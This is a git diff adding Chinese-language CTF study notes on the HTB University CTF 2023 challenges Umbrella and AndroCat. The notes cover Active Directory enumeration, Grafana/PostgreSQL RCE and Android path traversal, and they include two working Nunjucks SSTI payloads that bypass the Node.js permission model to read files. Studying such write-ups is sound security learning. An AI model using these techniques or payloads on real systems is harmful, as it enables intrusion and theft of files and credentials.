@@ -1610,3 +1610,33 @@ tcachebins
 - Metabase pre-auth RCE： https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/ 。注意poc的构造会根据要攻击的实例的设置的不同而不同，但只要使用的Metabase版本是有漏洞的，就可以自己根据文章里的poc自己调试出别的poc。其他类似但有区别的做法：
   - https://sailingnn.github.io/htb-ctf-Apethanto/
 - 当运行id命令时发现当前用户处于sudo组，说明当前用户可以root身份运行命令，只是不知道密码。若满足 https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens 提到的条件（可用[pspy](https://github.com/DominicBreuker/pspy)监控linux进程），即可使用[sudo_inject](https://github.com/nongiach/sudo_inject)用root身份执行命令
+155. [Umbrella](https://www.rayanle.cat/umbrella-htb-uni-ctf-2023/)
+- nmap使用。如果扫出来的结果包含LDAP (389, 3268, 3269), DNS (53) 和 Kerberos (88)，表明扫描的机器可能是一台域控制器（domain controller）
+- openssl分析ip所使用的TLS证书。nmap扫出来的LDAP域名，TLS证书上的名称和hostname都可以添加到/etc/hosts文件中方便后续访问
+- network service exploitation tool NetExec（nxc）使用：
+  - smb：enumerating file shares and users as anonymous and guest。获取keylab名称和内部的RC4密钥后就能直接拿文件了
+  - ldap：enumerating users using an anonymous bind，用Kerberos协议检查某些账号是否存在于某个域名。如果得到`KDC_ERR_C_PRINCIPAL_UNKNOWN`就说明不存在。也可以在获取密码后尝试登录，若得到`STATUS_PASSWORD_MUST_CHANGE`，说明密码正确但需要更改。这种情况有几种情况可以远程改密码，参考 https://www.n00py.io/2021/09/resetting-expired-passwords-remotely 。登录成功后，可以用Bloodhound查看用户的权利以及域内是否有错误的配置
+- [certipy](https://github.com/ly4k/Certipy)使用
+- [ldeep](https://github.com/franc-pentest/ldeep)使用
+- [impacket](https://github.com/fortra/impacket)中的[dacledit.py](https://github.com/fortra/impacket/blob/204c5b6b73f4d44bce0243a8f345f00e308c9c20/examples/dacledit.py)使用，用于列出ACES并检查是否可以修改某些属性。修改可以用ldapmodify
+- 可以直接请求Grafana的api datasource。如果请求PostgreSQL datasource没出错，就能利用PostgreSQL使用sql语句查询进而获取RCE
+- a keytab is a file which allows you to store the different Kerberos keys of a principal。可以用klist命令提取某个keylab的RC4密钥
+156. [AndroCat](https://jorianwoltjer.com/blog/p/ctf/htb-university-ctf-2023/androcat)
+- Android WebResourceResponse漏洞： https://blog.oversecured.com/Android-Exploring-vulnerabilities-in-WebResourceResponse/ 。`getLastPathSegment()`方法返回的内容是url decode后的，如果事先传入urlencode的payload，解码后就可能得到路径穿越。得到路径穿越后`shared_prefs/auth.xml`里可能有敏感内容（SharedPreferences会引用这个文件）
+- 利用PDF渲染可进行server side xss的漏洞获取SSH Private Key
+- NUNJUCKS nodejs SSTI漏洞利用时若遇见`Access to this API has been restricted`，这是nodejs的实验性功能，用于阻拦文件读写。可利用 [Permission model can be bypassed by specifying a path traversal sequence in a Buffer](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32004) 绕过，做法参考wp或是 https://hackerone.com/reports/2051257 (以下为ssti payload)：
+```js
+{{range.constructor("
+try {
+    const fs = process.binding('fs');
+    let file = fs.readFileSync('/path_of_allow-fs-read/../flag', 0);
+    return file;
+} catch (err) {
+  return err;
+}
+")()}}
+```
+```js
+{{range.constructor("return process.binding('fs').readFileSync('/path_of_allow-fs-read/../flag', 0)")()}}
+```
+- 其他wp： https://www.youtube.com/watch?v=NNqYDbLdTkg 。还讲了一些杂项内容，比如androidStudio模拟器的使用，如何用bp抓模拟器的包等
